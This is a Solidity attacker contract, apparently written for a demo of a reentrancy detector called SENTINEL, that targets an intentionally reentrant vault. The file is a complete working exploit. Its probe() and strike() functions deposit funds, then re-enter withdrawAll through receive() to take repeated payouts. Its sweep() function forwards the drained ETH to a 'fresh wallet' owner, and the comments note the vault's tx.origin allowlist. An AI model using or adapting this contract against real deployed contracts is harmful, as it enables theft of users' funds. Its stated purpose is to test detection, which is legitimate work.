// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @notice The two vault calls this demo attacker uses. deposit credits msg.sender; withdrawAll pays that credit.
interface IDemoVault {
    function deposit() external payable;
    function withdrawAll() external;
}

/// @title Attacker
/// @notice Demo attacker for the intentionally reentrant vault. Judges: read receive() together with withdrawAll.
/// @dev probe() re-enters once and takes 2x its deposit. That small test call is what SENTINEL is meant to catch.
///      strike() repeats the same bug up to maxReentries times. The vault's allowlist is on tx.origin, so the
///      fresh wallet that calls this contract must be allowlisted. This contract itself is msg.sender on the vault.
contract Attacker {
    /// @notice Fresh wallet that deployed this contract and is the only account that may call probe, strike, or sweep.
    address public immutable owner;

    /// @notice Victim vault.
    IDemoVault public immutable vault;

    /// @notice How many extra withdrawAll calls receive() may still make.
    uint256 public reentriesLeft;

    /// @notice Size of the deposit that opened this attack. receive() stops if the vault can no longer pay this much.
    uint256 public lastDeposit;

    /// @notice Caller is not the fresh wallet that deployed this contract.
    error NotOwner();

    /// @notice Sending the stolen balance back to the owner failed.
    error TransferFailed();

    /// @notice probe finished. The argument is this contract's ETH balance, which is 2x the deposit when the vault had funds.
    event Probed(uint256 balance);

    /// @notice strike finished. The argument is this contract's ETH balance after the reentrant withdrawals.
    event Struck(uint256 balance);

    /// @param _vault Vulnerable vault to deposit into and withdraw from.
    constructor(address _vault) {
        owner = msg.sender;
        vault = IDemoVault(_vault);
    }

    /// @notice Only the deploying wallet.
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    /// @notice Small test call. Re-enters once, so a funded vault pays this contract twice its deposit.
    function probe() external payable onlyOwner {
        reentriesLeft = 1;
        lastDeposit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
        emit Probed(address(this).balance);
    }

    /// @notice Real drain. Re-enters up to maxReentries times, once per receive(), while the vault can still pay lastDeposit.
    /// @param maxReentries Extra withdrawals after the first. strike(10) can take 11 payments if the vault is full.
    function strike(uint256 maxReentries) external payable onlyOwner {
        reentriesLeft = maxReentries;
        lastDeposit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
        emit Struck(address(this).balance);
    }

    /// @notice The vault pays this contract before it clears the credit, so this can call withdrawAll again.
    /// @dev The msg.sender check ignores ETH that did not come from the vault. reentriesLeft stops the loop.
    receive() external payable {
        if (msg.sender == address(vault) && reentriesLeft > 0 && address(vault).balance >= lastDeposit) {
            reentriesLeft--;
            vault.withdrawAll();
        }
    }

    /// @notice Send everything this contract holds back to the fresh wallet.
    function sweep() external onlyOwner {
        (bool ok,) = owner.call{value: address(this).balance}("");
        if (!ok) revert TransferFailed();
    }
}
